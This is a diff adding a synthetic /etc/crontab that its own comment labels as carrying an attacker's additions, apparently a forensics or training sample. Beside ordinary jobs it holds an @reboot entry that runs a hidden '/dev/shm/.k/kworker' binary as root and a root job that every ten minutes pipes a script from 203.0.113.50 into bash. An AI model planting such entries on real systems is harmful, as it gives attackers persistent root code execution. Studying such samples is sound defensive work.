@@ -1,0 +1,9 @@
+# /etc/crontab with an attacker's additions (synthetic).
+SHELL=/bin/bash
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+MAILTO=""
+
+17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
+@reboot		root	/dev/shm/.k/kworker >/dev/null 2>&1
+*/10 * * * *	root	curl -fsSL http://203.0.113.50/u.sh | bash
+0 3 * * mon-fri	www-data	php /var/www/cron.php
